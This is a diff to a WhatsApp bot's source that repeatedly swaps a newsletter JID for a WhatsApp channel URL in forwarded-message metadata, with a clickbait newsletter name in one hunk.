@@ -433,7 +433,7 @@ forwardingScore: 999,
 isForwarded: true,
 forwardedNewsletterMessageInfo: {
 newsletterName: "Click here to get $69",
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: "https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G",
 },
 externalAdReply: {  
 showAdAttribution: true,
@@ -1655,7 +1655,7 @@ const sendSlide = async (jid, title, message, footer, slides) => {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -1799,7 +1799,7 @@ break
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -1877,7 +1877,7 @@ break
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -2245,7 +2245,7 @@ case 'listowner': {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -2316,7 +2316,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -2388,7 +2388,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -2460,7 +2460,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -2532,7 +2532,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -2604,7 +2604,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -2676,7 +2676,7 @@ if (!XeonTheCreator) return XeonStickOwner()
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -2748,7 +2748,7 @@ if (!XeonTheCreator) return XeonStickOwner()
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -2820,7 +2820,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -2893,7 +2893,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -2966,7 +2966,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -3039,7 +3039,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -3112,7 +3112,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -3183,7 +3183,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -3490,7 +3490,7 @@ if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -3587,7 +3587,7 @@ replygcxeon('Success in turning off nsfw in this group')
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -3669,7 +3669,7 @@ if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -3744,7 +3744,7 @@ if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -3838,7 +3838,7 @@ if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -3913,7 +3913,7 @@ if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -3988,7 +3988,7 @@ if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -4063,7 +4063,7 @@ if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -4138,7 +4138,7 @@ if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -4213,7 +4213,7 @@ if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -4305,7 +4305,7 @@ if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -4380,7 +4380,7 @@ if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -4455,7 +4455,7 @@ if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -4530,7 +4530,7 @@ if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -4605,7 +4605,7 @@ if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -4679,7 +4679,7 @@ if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -4753,7 +4753,7 @@ if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -4827,7 +4827,7 @@ if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -4901,7 +4901,7 @@ if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -4975,7 +4975,7 @@ if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -5048,7 +5048,7 @@ if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -5121,7 +5121,7 @@ if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -5619,7 +5619,7 @@ break
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -5691,7 +5691,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -6630,7 +6630,7 @@ Type *surrender* to give up and admit defeat`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -6718,7 +6718,7 @@ break
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -6791,7 +6791,7 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -7386,7 +7386,7 @@ let yts = require("yt-search")
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -7941,7 +7941,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -7994,7 +7994,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -8040,7 +8040,7 @@ contextInfo: {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -8086,7 +8086,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -8132,7 +8132,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -8178,7 +8178,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -8224,7 +8224,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -8270,7 +8270,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -8316,7 +8316,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -8361,7 +8361,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -8407,7 +8407,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -8453,7 +8453,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -8499,7 +8499,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -8545,7 +8545,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -8591,7 +8591,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -8637,7 +8637,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -8683,7 +8683,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -8729,7 +8729,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -8775,7 +8775,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -8821,7 +8821,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -8867,7 +8867,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -8913,7 +8913,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -8959,7 +8959,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -9005,7 +9005,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -9051,7 +9051,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -9097,7 +9097,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -9143,7 +9143,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -9189,7 +9189,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -9235,7 +9235,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -9281,7 +9281,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -9327,7 +9327,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -9373,7 +9373,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -9426,7 +9426,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -9472,7 +9472,7 @@ _*Here is the result of: ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
